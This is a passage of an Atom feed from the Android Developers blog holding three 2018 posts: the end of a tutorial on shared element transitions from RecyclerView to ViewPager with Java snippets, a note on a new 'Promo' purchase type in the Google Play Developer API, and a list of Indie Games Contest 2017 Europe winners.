To fix it, we exclude the clicked card from the exit transition before commiting the fragment transaction at the &lt;code&gt;GridAdapter&lt;/code&gt;.
&lt;/p&gt;



&lt;pre class="prettyprint"&gt;// The 'view' is the card view that was clicked to initiate the transition.
((TransitionSet) fragment.getExitTransition()).excludeTarget(view, true);&lt;/pre&gt;


&lt;p&gt;
After this change, the animation looks much better (the clicked card doesn't fade out as part of the exit transition, while the rest of the cards fade out):
&lt;/p&gt;

&lt;center&gt;&lt;div class="cont221"&gt;&lt;a href="https://4.bp.blogspot.com/-tCyRBKWl7IE/WoYXqy6EbhI/AAAAAAAAFFA/qyuptYGx_f0-aSMnN1S8apelJ4998Sl2QCLcBGAs/s1600/with-excluding-item.gif" imageanchor="1"target="_blank" attribute" &gt;&lt;img border="0" src="https://4.bp.blogspot.com/-tCyRBKWl7IE/WoYXqy6EbhI/AAAAAAAAFFA/qyuptYGx_f0-aSMnN1S8apelJ4998Sl2QCLcBGAs/s1600/with-excluding-item.gif" data-original-width="444" data-original-height="859" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;
As a final touch, we set up the &lt;code&gt;GridFragment&lt;/code&gt; to scroll and reveal the card we transition to when navigating back from the pager (done at the &lt;code&gt;onViewCreated&lt;/code&gt;):
&lt;/p&gt;



&lt;code&gt;&amp;lt;GridFragment.java&gt;&lt;/code&gt;




&lt;pre class="prettyprint"&gt;recyclerView.addOnLayoutChangeListener(
   new OnLayoutChangeListener() {
      @Override
      public void onLayoutChange(View view,
                int left, 
                int top, 
                int right, 
                int bottom, 
                int oldLeft, 
                int oldTop, 
                int oldRight, 
                int oldBottom) {
         recyclerView.removeOnLayoutChangeListener(this);
         final RecyclerView.LayoutManager layoutManager =
            recyclerView.getLayoutManager();
         View viewAtPosition = 
            layoutManager.findViewByPosition(MainActivity.currentPosition);
         // Scroll to position if the view for the current position is null (not   
         // currently part of layout manager children), or it's not completely
         // visible.
         if (viewAtPosition == null 
             || layoutManager.isViewPartiallyVisible(viewAtPosition, false, true)){
            recyclerView.post(() 
               -&gt; layoutManager.scrollToPosition(MainActivity.currentPosition));
         }
     }
});&lt;/pre&gt;


&lt;p&gt;
&lt;strong&gt;Wrapping up&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
In this article, we implemented a smooth transition from a &lt;code&gt;RecyclerView&lt;/code&gt; to a &lt;code&gt;ViewPager&lt;/code&gt; and back.
&lt;/p&gt;
&lt;p&gt;
We showed how to postpone a transition and start it after the views are ready. We also implemented shared element &lt;em&gt;remapping&lt;/em&gt; to get the transition going when shared views are changing dynamically while navigating the app.
&lt;/p&gt;


&lt;p&gt;
These changes transformed our app's fragment transitions to provide better visual continuity as users interact with it. 
&lt;/p&gt;
&lt;p&gt;
&lt;div class="block"&gt;&lt;a href="https://2.bp.blogspot.com/-j61BxvPQ4sw/WoYX2Xwl0vI/AAAAAAAAFFE/kBeFOiGq6L4dnytb37XplbVwJ_yqCB38gCLcBGAs/s1600/app-without-transitions.gif" imageanchor="1"target="_blank" attribute" &gt;&lt;img border="0" src="https://2.bp.blogspot.com/-j61BxvPQ4sw/WoYX2Xwl0vI/AAAAAAAAFFE/kBeFOiGq6L4dnytb37XplbVwJ_yqCB38gCLcBGAs/s1600/app-without-transitions.gif" data-original-width="444" data-original-height="859" style="display:inline-block;  max-width:35%;" /&gt;&lt;/a&gt; 

&lt;a href="https://2.bp.blogspot.com/-T6m5FS1HWR0/WoYYbAvUJQI/AAAAAAAAFFY/61V5NhiCyMwTK-9fRgSYMTtucOvIDlKggCLcBGAs/s1600/arrow.png" imageanchor="1" target="_blank" attribute"&gt;&lt;img border="0" src="https://2.bp.blogspot.com/-T6m5FS1HWR0/WoYYbAvUJQI/AAAAAAAAFFY/61V5NhiCyMwTK-9fRgSYMTtucOvIDlKggCLcBGAs/s1600/arrow.png" data-original-width="126" data-original-height="75" style="display:inline-block; margin:0 0 30% 0;"  /&gt;&lt;/a&gt;


&lt;a href="https://1.bp.blogspot.com/-SNCtXE5hWnA/WodR6VvS1CI/AAAAAAAAFGA/S4875u4sF8E2cALkutydZ-5F_1qMTaIgwCLcBGAs/s1600/app-with-transitions.gif" imageanchor="1"target="_blank" attribute" &gt;&lt;img border="0" src="https://1.bp.blogspot.com/-SNCtXE5hWnA/WodR6VvS1CI/AAAAAAAAFGA/S4875u4sF8E2cALkutydZ-5F_1qMTaIgwCLcBGAs/s1600/app-with-transitions.gif" data-original-width="444" data-original-height="859" style="display:inline-block; max-width:35%;"  /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;
The code for the demo app can be found &lt;a href="https://github.com/google/android-transition-examples/tree/master/GridToPager"target="_blank" attribute"&gt;here&lt;/a&gt;.
&lt;/p&gt;




&lt;style&gt;
.cont221 img{
max-width: 35%;


&lt;/style&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=ZnPrDnvHVCg:gGUIQyGnCpM:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=ZnPrDnvHVCg:gGUIQyGnCpM:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=ZnPrDnvHVCg:gGUIQyGnCpM:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/ZnPrDnvHVCg" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/3903393641843860369"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/3903393641843860369"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/ZnPrDnvHVCg/continuous-shared-element-transitions.html" title="Continuous Shared Element Transitions: RecyclerView to ViewPager"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://2.bp.blogspot.com/-SYxpgdCZYdQ/WoYW8x3m0II/AAAAAAAAFEs/m4ZE9gpGwsE1n1SopuBkvbg9_IGzGqgpgCLcBGAs/s72-c/intro.gif" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/02/continuous-shared-element-transitions.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-2820887736436730805</id>
    <published>2018-02-14T09:00:00.000-08:00</published>
    <updated>2018-02-16T12:21:41.136-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="API"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="billing"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Google"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="play"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="update"/>
    <title type="text">A better way to track your promotions on Google Play Billing</title>
    <content type="html">&lt;meta name="twitter:image" content="https://3.bp.blogspot.com/-0yD_I4ibFtw/WoOOI0C3zhI/AAAAAAAAFEM/ODUT_VF4JR0QLMjND3CjEsvVOPw9vXEQgCLcBGAs/s1600/12.png"&gt;

&lt;em&gt;Posted by Neto Marin, Developer Advocate&lt;/em&gt;

&lt;p&gt;
Promotions can be a valuable tool to increase user engagement or attract new users by offering content or features to a limited number of users free of charge.
&lt;/p&gt;
&lt;p&gt;
We are happy to share an improvement in the &lt;a href="https://developers.google.com/android-publisher/"&gt;Google Play Developer API&lt;/a&gt; that makes it easier to track your promotions from your own backend. Starting today, the API for &lt;a href="https://developers.google.com/android-publisher/api-ref/purchases/products"&gt;Purchases.products&lt;/a&gt; will return "&lt;code&gt;Promo"&lt;/code&gt; as a new value for the field &lt;code&gt;purchaseType&lt;/code&gt; when the user redeems a promo code. Now, the possible values are:
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;&lt;code&gt;0. Test&lt;/code&gt; (test purchases)
&lt;li&gt;&lt;code&gt;1. Promo&lt;/code&gt; (Promo code redemption purchase)&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;
For purchases made using the standard in-app billing flow, the field will continue to not be set in the API response.
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Please note&lt;/strong&gt;: This state is only returned by the &lt;a href="https://developers.google.com/android-publisher/api-ref/purchases/products"&gt;Purchases.products&lt;/a&gt; API. For subscriptions you may use &lt;a href="https://developer.android.com/google/play/billing/billing_subscriptions.html#trials"&gt;Free Trials&lt;/a&gt; to offer free of charge subscription periods.
&lt;/p&gt;
&lt;p&gt;
For more details about how to create and redeem promo codes, check the &lt;a href="https://developer.android.com/google/play/billing/billing_promotions.html"&gt;In-app Promotions&lt;/a&gt; documentation. For more details about the server-side API, check the &lt;a href="https://developers.google.com/android-publisher/"&gt;Google Play Developer API&lt;/a&gt; documentation.
&lt;/p&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=Aex5eOFYqAU:HNkaXeBCXA8:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=Aex5eOFYqAU:HNkaXeBCXA8:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=Aex5eOFYqAU:HNkaXeBCXA8:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/Aex5eOFYqAU" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/2820887736436730805"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/2820887736436730805"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/Aex5eOFYqAU/a-better-way-to-track-your-promotions.html" title="A better way to track your promotions on Google Play Billing"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/02/a-better-way-to-track-your-promotions.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-7046069072725143287</id>
    <published>2018-02-13T14:43:00.001-08:00</published>
    <updated>2018-02-13T14:49:16.963-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="Android"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="android developers"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="business"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="competition"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="contest"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="developer"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Europe"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Featured"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Games"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Google Play"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="grow"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="indie"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Indie Contest"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Indie games contest"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="indies"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="London"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="prizes"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Saatchi"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="win"/>
    <title type="text"> Congratulations to the winners of the Google Play Indie Games Contest  2017 in Europe</title>
    <content type="html">&lt;meta name="twitter:image" content="https://1.bp.blogspot.com/-wywvvr3ZL7I/WoNka2jPy5I/AAAAAAAAFC0/F07g1ciL-No_Nv9G8D1YVw8bbXfg47gugCLcBGAs/s1600/1.jpg"&gt;

&lt;em&gt;Posted by Adriana Puchianu, Developer Marketing Google Play&lt;/em&gt;

&lt;p&gt;
We have just wrapped up the second edition of the &lt;a href="https://events.withgoogle.com/indie-games-contest-2017/"&gt;Google Play Indie Games Contest in Europe&lt;/a&gt;! The iconic Saatchi Gallery in London welcomed &lt;a href="https://android-developers.googleblog.com/2018/01/meet-finalists-of-google-play-indie.html"&gt;20 developers&lt;/a&gt;, from 12 countries, who showcased their games to the audience of gamers, industry experts, and journalists. 
&lt;/p&gt;
&lt;p&gt;
The finalists' games were on show to the public, who spent three hours trying out their games and voting for their favourites, alongside the Google Play team. The top 10 finalists were then selected, and went on to pitch their games, and compete for the big prizes in front of our &lt;a href="https://events.withgoogle.com/indie-games-contest-2017/jury/#content"&gt;jury&lt;/a&gt;. 
&lt;/p&gt;

&lt;a href="https://1.bp.blogspot.com/-wywvvr3ZL7I/WoNka2jPy5I/AAAAAAAAFC0/F07g1ciL-No_Nv9G8D1YVw8bbXfg47gugCLcBGAs/s1600/1.jpg" imageanchor="1" &gt;&lt;img border="0" src="https://1.bp.blogspot.com/-wywvvr3ZL7I/WoNka2jPy5I/AAAAAAAAFC0/F07g1ciL-No_Nv9G8D1YVw8bbXfg47gugCLcBGAs/s1600/1.jpg" data-original-width="1600" data-original-height="960" style="max-width: 100%;" /&gt;&lt;/a&gt;

&lt;p&gt;
Please join us in congratulating the winners! They will be bringing home a well-deserved diploma, along with a prize package that will help them reach more gamers worldwide; including premium placement on the Google Play Store, marketing campaigns of up to 100,000 EUR and influencer campaigns of up to 50,000 EUR, the latest Google hardware, tickets to Google I/O, and much &lt;a href="https://events.withgoogle.com/indie-games-contest-2017/prizes/#content"&gt;more&lt;/a&gt;.
&lt;/p&gt;
&lt;p&gt;
It's really inspiring to see the excitement around this second edition, and great to see the new wave of indie games coming from  Europe. We are already looking forward to playing the games that will be developed in 2018! 
&lt;/p&gt;
&lt;p&gt;
Check out the main winners and the other finalists on the &lt;a href="https://play.google.com/store/apps/editorial_collection/promotion_topic_3002f6a_indie_games_contest_europe_2017_tp?e=-EnableAppDetailsPageRedesign"&gt;Google Play Store&lt;/a&gt;!
&lt;/p&gt;
&lt;p&gt;
&lt;h1&gt;Winner&lt;/h1&gt;
&lt;/p&gt;

&lt;div class="congrats213"&gt;&lt;a href="https://4.bp.blogspot.com/-D89R1VBuriE/WoNkpbu0WcI/AAAAAAAAFC4/XnM7xAvPTFURzXh8wypUqoDeV2I06L8kQCLcBGAs/s1600/2.png" imageanchor="1" &gt;&lt;img border="0" src="https://4.bp.blogspot.com/-D89R1VBuriE/WoNkpbu0WcI/AAAAAAAAFC4/XnM7xAvPTFURzXh8wypUqoDeV2I06L8kQCLcBGAs/s1600/2.png" data-original-width="1340" data-original-height="1340" /&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;
&lt;strong&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.plug_in_digital.emma"&gt;Bury me, my love&lt;/a&gt;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Playdius&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;France&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
A reality-inspired interactive fiction designed for mobile phones. It tells the story of Nour, a Syrian woman trying to reach Europe in hope of a better life.
&lt;/p&gt;
&lt;p&gt;
&lt;h1&gt;Runners up&lt;/h1&gt;
&lt;/p&gt;

&lt;div class="congrats213"&gt;&lt;a href="https://3.bp.blogspot.com/-L5AxCpyAo0w/WoNkypgVW1I/AAAAAAAAFC8/YwP82JV-0Cs9-llxFxpSvmSIhZjP7hrEwCLcBGAs/s1600/3.png" imageanchor="1" &gt;&lt;img border="0" src="https://3.bp.blogspot.com/-L5AxCpyAo0w/WoNkypgVW1I/AAAAAAAAFC8/YwP82JV-0Cs9-llxFxpSvmSIhZjP7hrEwCLcBGAs/s1600/3.png" data-original-width="1340" data-original-height="1340" /&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;
&lt;strong&gt;&lt;a href="https://play.google.com/store/apps/details?id=es.brokenrul.oldmansjourney"&gt;Old Man's Journey&lt;/a&gt;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Broken Rules Interactive Media GmbH&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Austria&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
A story game about life's precious moments, broken dreams, and changed plans.
&lt;/p&gt;

&lt;div class="congrats213"&gt;&lt;a href="https://3.bp.blogspot.com/-TSQOXXbFpkA/WoNk5O7O9II/AAAAAAAAFDA/YXc0OTfI87wih_WPcjA7f_SKnmzikEHewCLcBGAs/s1600/4.png" imageanchor="1" &gt;&lt;img border="0" src="https://3.bp.blogspot.com/-TSQOXXbFpkA/WoNk5O7O9II/AAAAAAAAFDA/YXc0OTfI87wih_WPcjA7f_SKnmzikEHewCLcBGAs/s1600/4.png" data-original-width="1340" data-original-height="1340" /&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;
&lt;strong&gt;&lt;a href="https://play.google.com/store/apps/details?id=air.com.bartbonte.yellow"&gt;Yellow&lt;/a&gt;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Bart Bonte&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Belgium&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
A puzzle game for you! A love letter to a marvelous colour and to the little wonder called touchscreens. Warning: very yellow!
&lt;/p&gt;
&lt;h1&gt;
The other games that have made it into top 10 are:
&lt;/h1&gt;

&lt;div class="congrats213"&gt;&lt;a href="https://1.bp.blogspot.com/-RD5eX4-jMWg/WoNlBStparI/AAAAAAAAFDI/bUzTc1fw2mAPVSUjM86i9yhe4gwI4B89ACLcBGAs/s1600/5.png" imageanchor="1" &gt;&lt;img border="0" src="https://1.bp.blogspot.com/-RD5eX4-jMWg/WoNlBStparI/AAAAAAAAFDI/bUzTc1fw2mAPVSUjM86i9yhe4gwI4B89ACLcBGAs/s1600/5.png" data-original-width="1340" data-original-height="1340" /&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;
&lt;strong&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.picodongames.CaptainTomGT"&gt;Captain Tom Galactic Traveler&lt;/a&gt;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Picodongames&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;France&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
An open world platformer and space exploration game. Embark on an exploratory mission, discover planets, collect oxygen, play with gravity.
&lt;/p&gt;

&lt;div class="congrats213"&gt;&lt;a href="https://1.bp.blogspot.com/-PNGY6TEqkCo/WoNlGhMIiiI/AAAAAAAAFDM/PkAVQIZ-XiotQgFO9zfKRFroSUF5UvaTwCLcBGAs/s1600/6.png" imageanchor="1" &gt;&lt;img border="0" src="https://1.bp.blogspot.com/-PNGY6TEqkCo/WoNlGhMIiiI/AAAAAAAAFDM/PkAVQIZ-XiotQgFO9zfKRFroSUF5UvaTwCLcBGAs/s1600/6.png" data-original-width="1340" data-original-height="1340" /&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;
&lt;strong&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.zutgames.ilovehue"&gt;I Love Hue&lt;/a&gt;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Zut!&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;United Kingdom&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
A minimalist, ambient puzzle game influenced by mindfulness apps and abstract art. Players arrange shuffled mosaics of coloured tiles into perfectly ordered palettes.
&lt;/p&gt;

&lt;div class="congrats213"&gt;&lt;a href="https://1.bp.blogspot.com/-x5_eWiyCWCw/WoNlMEIY4MI/AAAAAAAAFDQ/ZZZhc5w-1YA7JFZsFZuwNRP1Qogdytq7ACLcBGAs/s1600/7.png" imageanchor="1" &gt;&lt;img border="0" src="https://1.bp.blogspot.com/-x5_eWiyCWCw/WoNlMEIY4MI/AAAAAAAAFDQ/ZZZhc5w-1YA7JFZsFZuwNRP1Qogdytq7ACLcBGAs/s1600/7.png" data-original-width="1340" data-original-height="1340" /&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;
&lt;strong&gt;&lt;a href="https://play.google.com/store/apps/details?id=air.com.gamebrain.jodeo"&gt;Jodeo&lt;/a&gt;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Gamebra.in&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Turkey&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
Jodeo is a 2D jelly critter. There's something it's curious about: what if 3D objects and 2D physics are in the same game? How can 2D objects interact with 3D objects?
&lt;/p&gt;

&lt;div class="congrats213"&gt;&lt;a href="https://3.bp.blogspot.com/-qfIsHQ7m-YE/WoNlTdp5UkI/AAAAAAAAFDU/2H4a-XJtOHwUetQf44AYDleOpKSnzsmKACLcBGAs/s1600/8.png" imageanchor="1" &gt;&lt;img border="0" src="https://3.bp.blogspot.com/-qfIsHQ7m-YE/WoNlTdp5UkI/AAAAAAAAFDU/2H4a-XJtOHwUetQf44AYDleOpKSnzsmKACLcBGAs/s1600/8.png" data-original-width="1340" data-original-height="1340" /&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;
&lt;strong&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.stateofplaygames.kami2"&gt;Kami 2&lt;/a&gt;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;State of Play&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;United Kingdom&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
The calming yet addictive puzzle game is back! With over 100 handcrafted puzzles, it takes you on a mind-twisting journey that combines logic and problem-solving.
&lt;/p&gt;

&lt;div class="congrats213"&gt;&lt;a href="https://1.bp.blogspot.com/-GG5QC67Gobg/WoNlYy8IR_I/AAAAAAAAFDc/uWfC1UxcQHI6nwp2L7OqDN0uJ_RlftYugCLcBGAs/s1600/9.png" imageanchor="1" &gt;&lt;img border="0" src="https://1.bp.blogspot.com/-GG5QC67Gobg/WoNlYy8IR_I/AAAAAAAAFDc/uWfC1UxcQHI6nwp2L7OqDN0uJ_RlftYugCLcBGAs/s1600/9.png" data-original-width="1340" data-original-height="1340" /&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;
&lt;strong&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.fiftytwo.kensho_android"&gt;Kenshō&lt;/a&gt;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;FIFTYTWO&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Russia&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
A tile sliding puzzle with a wonderful soundtrack. Mysterious things happen in a ruined room. Doors inside that room lead to different worlds and beautiful landscapes.
&lt;/p&gt;

&lt;div class="congrats213"&gt;&lt;a href="https://3.bp.blogspot.com/-I66_I0g03w4/WoNldioY4dI/AAAAAAAAFDg/EL-dXKLXZPADDtUWY6DGjNMAxOiWSnbZACLcBGAs/s1600/10.png" imageanchor="1" &gt;&lt;img border="0" src="https://3.bp.blogspot.com/-I66_I0g03w4/WoNldioY4dI/AAAAAAAAFDg/EL-dXKLXZPADDtUWY6DGjNMAxOiWSnbZACLcBGAs/s1600/10.png" data-original-width="1340" data-original-height="1340" /&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;
&lt;strong&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.tommysoereide.NoMoreButtons&amp;e=-EnableAppDetailsPageRedesign"&gt;No More Buttons&lt;/a&gt;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;&lt;a href="https://play.google.com/store/apps/developer?id=Tommy+S%C3%B8reide+Kj%C3%A6r"&gt;Tommy Søreide Kjær&lt;/a&gt; &lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Norway&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
A hand-drawn platformer where the buttons are part of the environment.
&lt;/p&gt;

&lt;div class="congrats213"&gt;&lt;a href="https://3.bp.blogspot.com/-IC3qAdx8n5U/WoNljOYizxI/AAAAAAAAFDk/gAOX_zQiVZIX1Z6sU8WzQoYJ-_9AIvMbgCLcBGAs/s1600/11.png" imageanchor="1" &gt;&lt;img border="0" src="https://3.bp.blogspot.com/-IC3qAdx8n5U/WoNljOYizxI/AAAAAAAAFDk/gAOX_zQiVZIX1Z6sU8WzQoYJ-_9AIvMbgCLcBGAs/s1600/11.png" data-original-width="1340" data-original-height="1340" /&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;
&lt;strong&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.armorgames.thebigjourney.android"&gt;The Big Journey&lt;/a&gt;&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Catfishbox&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Ukraine&lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
Designed for kids and adults alike, this a beautiful, casual adventure. Tilt to roll around and explore a beautiful world with Mr. Whiskers.
&lt;/p&gt;
&lt;center&gt;&lt;p&gt;
How useful did you find this blogpost? 
&lt;/p&gt;
&lt;p&gt;
&lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?entry.753333049=1%E2%98%85+%E2%80%93+Not+at+all&amp;entry.2056663615&amp;entry.646747778=indiesemeafinals-02/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=2%E2%98%85+%E2%80%93+Not+very&amp;entry.2056663615&amp;entry.646747778=indiesemeafinals-02/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=3%E2%98%85+%E2%80%93+Somewhat&amp;entry.2056663615&amp;entry.646747778=indiesemeafinals-02/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=4%E2%98%85+%E2%80%93+Very&amp;entry.2056663615&amp;entry.646747778=indiesemeafinals-02/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=5%E2%98%85+%E2%80%93+Extremely&amp;entry.2056663615&amp;entry.646747778=indiesemeafinals-02/18"&gt;★&lt;/a&gt;
&lt;/p&gt;
&lt;a href="https://2.bp.blogspot.com/-rkF2Wvr59EQ/WoNl0tjhyrI/AAAAAAAAFDw/rahakQnrS4QO-fKA774H5JSafcQpS5-7QCLcBGAs/s1600/12.png" imageanchor="1" &gt;&lt;img border="0" src="https://2.bp.blogspot.com/-rkF2Wvr59EQ/WoNl0tjhyrI/AAAAAAAAFDw/rahakQnrS4QO-fKA774H5JSafcQpS5-7QCLcBGAs/s1600/12.png" data-original-width="499" data-original-height="281" style="max-width: 60%;"/&gt;&lt;/a&gt;
&lt;/p&gt;&lt;/center&gt;

&lt;style&gt;

.congrats213 img{
max-width: 20%;
margin: -10px;
border-radius: 25%;


}
&lt;/style&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=U_IsOJgAf34:boIGv-6PqTI:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=U_IsOJgAf34:boIGv-6PqTI:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=U_IsOJgAf34:boIGv-6PqTI:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/U_IsOJgAf34" height="1" width="1" alt=""/&gt;</content>
